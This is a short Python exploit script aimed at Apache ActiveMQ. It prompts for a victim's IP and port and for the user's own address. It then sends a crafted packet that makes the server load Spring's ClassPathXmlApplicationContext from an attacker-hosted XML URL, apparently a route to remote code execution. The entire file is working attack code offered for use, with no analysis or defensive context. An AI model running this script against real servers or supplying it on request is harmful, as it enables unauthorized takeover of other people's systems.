import socket

def int2hex(i,n):
    if n == 4:
        return format(i, '04x')
    elif n == 8:
        return format(i, '08x')
    else:
        raise ValueError("n should be 4 or 8")

def string2hex(s):
    return s.encode().hex()


def main(direcction_ip,port_target,your_direcction):
    if not direcction_ip or not your_direcction:
        print("You did not enter all the data.")
        return
    
    class_name = "org.springframework.context.support.ClassPathXmlApplicationContext"
    message = your_direcction
    
    header = "1f00000000000000000001"
    body = header + "01" + int2hex(len(class_name), 4) + string2hex(class_name) + "01" + int2hex(len(message), 4) + string2hex(message) 
    payload = int2hex(len(body) // 2,8) + body
    data = bytes.fromhex(payload)
    
    print("[+]Target:{}/{}".format(direcction_ip,port_target))
    print("[+]XML URL:{}".format(your_direcction))
    print("\n[+]Sendig packet:{}".format(payload))
    
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn.connect((direcction_ip,int(port_target)))
    conn.send(data)
    conn.close()
    

if __name__ == "__main__":
    
    direcction_ip = input("Enter the ip address of the victim machine:")
    
    port_target = input("Enter the ApacheMQ service port:")
    
    your_direcction = input(
        
"""
Enter your address and the port to use,

e.g. -> 127.0.0.0/8080
                            
->""")
    
    main(direcction_ip,port_target,your_direcction)
    
    